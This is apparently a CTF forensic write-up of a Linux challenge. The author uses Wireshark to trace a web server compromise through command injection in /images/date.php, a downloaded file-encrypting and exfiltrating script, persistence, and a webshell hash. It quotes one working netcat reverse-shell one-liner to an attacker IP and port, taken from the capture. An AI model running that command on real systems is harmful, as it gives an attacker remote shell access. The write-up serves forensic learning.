**Note: This is my write-up for one of the forensic challenges in Cyber Security Challenge competition organized by iTREXC (4th International Innovation, Technology & Research Exhibition and Conference). This "Compromised" challenge is in Linux Forensic category. The difficulty of this "Compromised" challenge is Medium.**

For this "Compromised" challenge, we were given a `.pcap` (packet capture) file named `traffic.pcap`. We can open the file with Wireshark and the first thing we need to do is filter for HTTP traffic. We can see that the attacker make a GET request to the web server asking for `/images/date.php`.

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/compromised-http-filter.png){:.align-center}

The attacker then compromised the web server by using a command injection to the web server through `/images/date.php` using POST method. The reverse shell script establish a connection to the attacker server : `159.223.43.45` port `4443`.

- `rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 159.223.43.45 4443 >/tmp/f`

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/compromised-http-post.png){:.align-center}

Because of that, we can follow the TCP stream of the reverse shell connection :

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/compromised-follow-tcp-stream.png){:.align-center}

We can see that the compromised server established a connection to `159.223.43.45`, which is the attacker server. By following the TCP stream of the reverse shell connection, we can see what's the attacker does in the compromised server.

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/compromised-tcp-stream.png){:.align-center}

The attacker navigate to `/home/nbs` and then download a file (`jahak.sh`) from the attacker's server to the compromised server. The `jahak.sh` file is a bash script that is used by the attacker to encrypt the document files in the compromised server using XOR encryption and transfer the encrypted files to the attacker's server.

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/compromised-persistent-get.png){:.align-center}

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/compromised-jahak-http.png){:.align-center}

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/compromised-jahak.png){:.align-center}

The attacker encrypt the `flag.txt` file and rename it to `important.txt` :

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/compromised-encrypted-file.png){:.align-center}

The attacker create a persistent using the command :

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/compromised-persistent-path.png){:.align-center}

There is one question that ask hash of the webshell that being access by the attacker and this is the answer :

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/compromised-export-object.png){:.align-center}

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/compromised-export-object-file.png){:.align-center}

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/compromised-ls.png){:.align-center}

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/compromised-file-hash.png){:.align-center}
